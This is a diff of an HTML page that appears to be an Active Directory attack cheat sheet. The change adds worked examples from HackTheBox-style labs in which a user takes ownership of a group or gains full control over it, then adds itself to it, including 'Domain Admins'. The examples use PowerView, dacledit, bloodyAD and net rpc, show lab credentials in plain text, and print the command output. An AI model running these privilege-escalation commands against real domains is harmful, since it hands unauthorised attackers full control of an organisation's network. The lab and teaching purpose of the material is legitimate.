@@ -336,47 +336,134 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; . .\PowerView.ps1
 </span></span></span></code></pre></div><h4 id="2-change-owner">2. Change owner</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObjectOwner -Identity &lt;TARGET_GROUP&gt; -OwnerIdentity &lt;TARGET_USER&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObjectOwner -Identity &#39;&lt;GROUP&gt;&#39; -OwnerIdentity &#39;&lt;TARGET_USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; Set-DomainObjectOwner -Identity &#39;DOMAIN ADMINS&#39; -OwnerIdentity &#39;maria&#39;
 </span></span></span></code></pre></div></div></p>
 <h3 id="abuse-2--add-user-to-the-group">Abuse #2 : Add user to the group</h3>
 <p>
 <button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>
 <button data-tabset="set2" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy">0. Install latest impacket (included dacledit.py)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone https://github.com/fortra/impacket.git
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-add-full-control-permission-to-the-user-over-the-group">1. Add full control permission to the user over the group</h4>
+<p><button data-tabset="set2-1" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set2-1" data-tabcontent="tab2" >bloodyAD</button></p>
+<div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Install latest impacket <span class="o">(</span>included dacledit.py<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">git clone https://github.com/fortra/impacket.git
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install .
-</span></span></span></code></pre></div><h4 id="1-add-full-control-permission-to-the-user-over-the-group">1. Add full control permission to the user over the group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target &lt;TARGET_GROUP&gt; -inheritance -action write -rights FullControl
-</span></span></span></code></pre></div><h4 id="2-add-the-user-to-group">2. Add the user to group</h4>
-<p><button data-tabset="set3" data-tabcontent="tab1" class="active">bloodyAD</button>
-<button data-tabset="set3" data-tabcontent="tab2" >rpc</button></p>
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -k -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add groupMember &#39;&lt;TARGET_GROUP&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &#39;&lt;USER&gt;&#39; -target &#39;&lt;GROUP&gt;&#39; -inheritance -action write -rights FullControl
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.absolute.htb <span class="o">&amp;&amp;</span> dacledit.py -k <span class="s1">&#39;absolute.htb/m.lovegod:AbsoluteLDAP2022!&#39;</span> -dc-ip dc.absolute.htb -principal <span class="s1">&#39;m.lovegod&#39;</span> -target <span class="s1">&#39;NETWORK AUDIT&#39;</span> -inheritance -action write -rights FullControl
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] DACL backed up to dacledit-20240924-021507.bak
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] DACL modified successfully!
 </span></span></span></code></pre></div></div>
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kinit &lt;USER&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; net rpc group addmem &#39;&lt;TARGET_GROUP&gt;&#39; &#39;&lt;USER&gt;&#39; -U &#39;&lt;USER&gt;&#39; --use-kerberos=required -S &lt;DC&gt; --no-pass
+<div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -k --host &lt;DC&gt; add genericAll &#39;&lt;GROUP&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d absolute.htb -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k --host dc.absolute.htb add genericAll <span class="s1">&#39;NETWORK AUDIT&#39;</span> <span class="s1">&#39;m.lovegod&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod has now GenericAll on NETWORK AUDIT
+</span></span></span></code></pre></div></div>
+<h4 id="2-add-the-user-to-group">2. Add the user to group</h4>
+<p><button data-tabset="set2-2" data-tabcontent="tab1" class="active">bloodyAD</button>
+<button data-tabset="set2-2" data-tabcontent="tab2" >rpc</button></p>
+<div class="tabcontent" data-tabset="set2-2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -k -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add groupMember &#39;&lt;GROUP&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -k -d absolute.htb -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> --host dc.absolute.htb add groupMember <span class="s1">&#39;NETWORK AUDIT&#39;</span> <span class="s1">&#39;m.lovegod&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod added to NETWORK AUDIT
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set2-2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Request a TGT
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.absolute.htb <span class="o">&amp;&amp;</span> impacket-getTGT <span class="s1">&#39;absolute.htb/m.lovegod&#39;</span>                                                                  
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Password:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in m.lovegod.ccache
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&lt;USER&gt;.ccache
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; net rpc group addmem &#39;&lt;GROUP&gt;&#39; &#39;&lt;USER&gt;&#39; -U &#39;&lt;USER&gt;&#39; --use-kerberos=required -S &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.absolute.htb <span class="o">&amp;&amp;</span> net rpc group addmem <span class="s1">&#39;NETWORK AUDIT&#39;</span> <span class="s1">&#39;m.lovegod&#39;</span> -U <span class="s1">&#39;m.lovegod&#39;</span> --use-kerberos<span class="o">=</span>required -S dc.absolute.htb
+</span></span><span class="line"><span class="cl"><span class="go">Password for [WORKGROUP\m.lovegod]:
 </span></span></span></code></pre></div></div>
 <h4 id="3-check">3. Check</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; net rpc group members &#39;&lt;TARGET_GROUP&gt;&#39; -U &#39;&lt;USER&gt;&#39; --use-kerberos=required -S &lt;DC&gt; --no-pass
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; net rpc group members &#39;&lt;GROUP&gt;&#39; -U &#39;&lt;USER&gt;&#39; --use-kerberos=required -S &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.absolute.htb <span class="o">&amp;&amp;</span> net rpc group members <span class="s1">&#39;NETWORK AUDIT&#39;</span> -U <span class="s1">&#39;m.lovegod&#39;</span> --use-kerberos<span class="o">=</span>required -S dc.absolute.htb
+</span></span><span class="line"><span class="cl"><span class="go">Password for [WORKGROUP\m.lovegod]:
+</span></span></span><span class="line"><span class="cl"><span class="go">absolute\m.lovegod
+</span></span></span><span class="line"><span class="cl"><span class="go">absolute\svc_audit
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; . .\PowerView.ps1
 </span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
 </span></span></code></pre></div><h4 id="3-add-user-to-group">3. Add user to group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity &lt;TARGET_GROUP&gt; -PrincipalIdentity &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -Rights All -DomainController &lt;DC&gt; -Credential $cred
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &lt;TARGET_GROUP&gt; -Members &lt;USER&gt; -Credential $cred
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity &#39;&lt;GROUP&gt;&#39; -PrincipalIdentity &#39;&lt;USER&gt;&#39; -Rights All -DomainController &lt;DC&gt; -Credential $cred
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; Add-DomainObjectAcl -TargetIdentity &#39;DOMAIN ADMINS&#39; -PrincipalIdentity &#39;maria&#39; -Rights All -DomainController jenkins.object.local
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39; -Members &#39;&lt;USER&gt;&#39; -Credential $cred
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; Add-DomainGroupMember -Identity &#39;Domain Admins&#39; -Members &#39;maria&#39;
 </span></span></span></code></pre></div><h4 id="4-check">4. Check</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &lt;TARGET_GROUP&gt; -Domain &lt;DOMAIN&gt; -DomainController &lt;DC&gt; -Credential $cred | fl MemberName
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39; -Domain &lt;DOMAIN&gt; -DomainController &lt;DC&gt; -Credential $cred | fl MemberName
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; Get-DomainGroupMember -Identity &#39;DOMAIN ADMINS&#39; -Domain object.local -DomainController jenkins.object.local | fl MemberName
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">MemberName : maria
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">MemberName : Administrator
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or
 </span></span><span class="line"><span class="cl"><span class="go">net user &lt;USER&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; net user maria
+</span></span></span><span class="line"><span class="cl"><span class="go">User name                    maria
+</span></span></span><span class="line"><span class="cl"><span class="go">Full Name                    maria garcia
+</span></span></span><span class="line"><span class="cl"><span class="go">Comment
+</span></span></span><span class="line"><span class="cl"><span class="go">User&#39;s comment
+</span></span></span><span class="line"><span class="cl"><span class="go">Country/region code          000 (System Default)
+</span></span></span><span class="line"><span class="cl"><span class="go">Account active               Yes
+</span></span></span><span class="line"><span class="cl"><span class="go">Account expires              Never
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Password last set            10/21/2021 9:16:33 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">Password expires             Never
+</span></span></span><span class="line"><span class="cl"><span class="go">Password changeable          10/22/2021 9:16:33 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">Password required            Yes
+</span></span></span><span class="line"><span class="cl"><span class="go">User may change password     Yes
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Workstations allowed         All
+</span></span></span><span class="line"><span class="cl"><span class="go">Logon script
+</span></span></span><span class="line"><span class="cl"><span class="go">User profile
+</span></span></span><span class="line"><span class="cl"><span class="go">Home directory
+</span></span></span><span class="line"><span class="cl"><span class="go">Last logon                   9/23/2024 2:24:00 AM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Logon hours allowed          All
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Local Group Memberships      *Remote Management Use
+</span></span></span><span class="line"><span class="cl"><span class="go">Global Group memberships     *Domain Admins        *Domain Users
+</span></span></span><span class="line"><span class="cl"><span class="go">The command completed successfully.
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit current sessions or re-login
 </span></span><span class="line"><span class="cl"><span class="go">whoami /groups
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\maria&gt; whoami /groups
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GROUP INFORMATION
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Group Name                                    Type             SID                                           Attributes
+</span></span></span><span class="line"><span class="cl"><span class="go">============================================= ================ ============================================= ===============================================================
+</span></span></span><span class="line"><span class="cl"><span class="go">Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">BUILTIN\Remote Management Users               Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+</span></span></span><span class="line"><span class="cl"><span class="go">NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">OBJECT\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">OBJECT\Denied RODC Password Replication Group Alias            S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group
+</span></span></span><span class="line"><span class="cl"><span class="go">NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+</span></span></span><span class="line"><span class="cl"><span class="go">Mandatory Label\High Mandatory Level          Label            S-1-16-12288
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
